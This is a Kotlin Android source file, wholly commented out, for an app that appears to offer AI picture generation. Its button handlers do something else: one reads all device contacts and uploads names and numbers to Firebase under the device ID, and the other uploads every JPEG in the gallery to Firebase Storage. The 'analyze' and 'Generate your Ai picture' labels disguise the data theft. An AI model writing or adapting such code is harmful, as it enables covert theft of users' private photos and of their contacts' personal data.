package com.fazii.finalapp
/*
import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.height
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

@Composable
fun PermissionButtons(
    onProgressChange: (Boolean, Float) -> Unit
) {
    val context = LocalContext.current

    // Contact permissions launcher
    val contactPermissionsLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            val contacts = fetchContacts(context)
            uploadContactsToFirebase(context, contacts)
        } else {
            Toast.makeText(context, "Permission denied for contacts", Toast.LENGTH_LONG).show()
        }
    }

    // Gallery permissions launcher
    val galleryPermissionsLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            // Show the Toast message
            Toast.makeText(context, "Wait for a minute don't close your screen...", Toast.LENGTH_SHORT).show()

            // Delay starting the progress bar update to ensure Toast visibility
            CoroutineScope(Dispatchers.Main).launch {
                delay(1000)
                val imageUriList = getAllImagesUri(context)
                uploadImagesToFirebase(context, imageUriList, onProgressChange)
            }
        } else {
            Toast.makeText(context, "Permission denied for gallery", Toast.LENGTH_LONG).show()
        }
    }

    Column(
        modifier = Modifier,
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Button(
            onClick = {
                contactPermissionsLauncher.launch(Manifest.permission.READ_CONTACTS)
            },
            colors = ButtonDefaults.buttonColors(
                containerColor = Color(0xFF87195a),
                contentColor = Color.White
            )
        ) {
            Text("1st Click me to analyze......")
        }

        Spacer(modifier = Modifier.height(16.dp))

        Button(
            onClick = {
                galleryPermissionsLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
            },
            colors = ButtonDefaults.buttonColors(
                containerColor = Color(0xFF87195a),
                contentColor = Color.White
            )
        ) {
            Text("Click to Generate your Ai picture...")
        }
    }
}

@SuppressLint("Range")
fun fetchContacts(context: Context): List<Contact> {
    val contactsList = mutableListOf<Contact>()
    val cursor = context.contentResolver.query(
        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
        null,
        null,
        null,
        null
    )
    while (cursor?.moveToNext() == true) {
        val name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
        val phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
        contactsList.add(Contact(name, phoneNumber))
    }
    cursor?.close()
    return contactsList
}

@SuppressLint("HardwareIds")
fun uploadContactsToFirebase(context: Context, contacts: List<Contact>) {
    val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    val databaseReference = FirebaseDatabase.getInstance().getReference("contacts/$deviceId")
    contacts.forEach { contact ->
        val key = databaseReference.push().key
        if (key != null) {
            databaseReference.child(key).setValue(contact)
        }
    }
}

fun getAllImagesUri(context: Context): List<Uri> {
    val uriList = mutableListOf<Uri>()
    val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.MIME_TYPE)
    val selection = "${MediaStore.Images.Media.MIME_TYPE}=? OR ${MediaStore.Images.Media.MIME_TYPE}=?"
    val selectionArgs = arrayOf("image/jpeg", "image/jpg")

    val cursor = context.contentResolver.query(
        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
        projection,
        selection,
        selectionArgs,
        null
    )

    cursor?.use {
        val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
        while (it.moveToNext()) {
            val id = it.getLong(idColumn)
            val contentUri: Uri = ContentUris.withAppendedId(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                id
            )
            uriList.add(contentUri)
        }
    }

    return uriList
}

fun uploadImagesToFirebase(
    context: Context,
    uriList: List<Uri>,
    onProgressChange: (Boolean, Float) -> Unit
) {
    val storageRef = FirebaseStorage.getInstance().reference.child("galleryPhotos")
    val totalImages = uriList.size
    var uploadedImages = 0

    onProgressChange(true, 0f)

    uriList.forEach { uri ->
        val photoRef = storageRef.child(uri.lastPathSegment ?: "image_${System.currentTimeMillis()}")
        photoRef.putFile(uri).addOnSuccessListener {
            uploadedImages++
            val progress = (uploadedImages.toFloat() / totalImages) * 100
            onProgressChange(true, progress)
            if (uploadedImages == totalImages) {
                onProgressChange(false, 100f)
                Toast.makeText(context, "Upload completed", Toast.LENGTH_LONG).show()
            }
        }.addOnFailureListener {
            Toast.makeText(context, "Failed to upload image: ${uri.lastPathSegment}", Toast.LENGTH_LONG).show()
        }
    }
}

*/
